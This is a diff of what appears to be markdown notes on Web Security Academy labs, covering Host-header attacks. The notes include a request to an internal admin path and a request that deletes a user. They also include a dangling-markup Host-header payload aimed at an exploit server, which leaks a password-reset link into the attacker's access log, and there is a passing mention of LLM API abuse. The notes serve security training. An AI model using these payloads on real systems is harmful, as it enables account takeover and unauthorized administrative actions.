@@ -3778,7 +3778,7 @@ LLM -> API: create_email_forwarding_rule('peter')
   - Resend the request with result of 302 resposne
     ```
     GET /admin
-     Host: 192.168.0.81
+    Host: 192.168.0.81
     ```
   - Delete the users
     `GET /admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos`
@@ -3814,12 +3814,12 @@ LLM -> API: create_email_forwarding_rule('peter')
     View raw: 
     <p>Hello!</p><p>Please <a href='https://0ac200060401dc0685ffa52900ed00d5.web-security-academy.net/login'>click here</a> to login with your new password: 7x2bwOs1lY</p><p>
     ```
-  - Tampering the domain name in the host header with arbitrary port number still trigger a password reset email  
+  - **Tampering the domain name in the host header with arbitrary port number** still trigger a password reset email  
     `<a href='https://0ac200060401dc0685ffa52900ed00d5.web-security-academy.net:8001/login'>`
-  - Inject a dangling-markup payload pointing to your exploit server  
+  - **Inject a dangling-markup payload pointing** to your exploit server  
     `Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`  
   - Access log, look for `GET /?/login'>`  
-    "GET /?/login'>click+here</a>+to+login+with+your+new+password:+GgfkWVd8so</p><p>Thanks,<br/>Support+team</p><i>This+emai
+    `"GET /?/login'>click+here</a>+to+login+with+your+new+password:+GgfkWVd8so</p>`
 
 ## OAuth Authentication
 Content for OAuth Authentication...
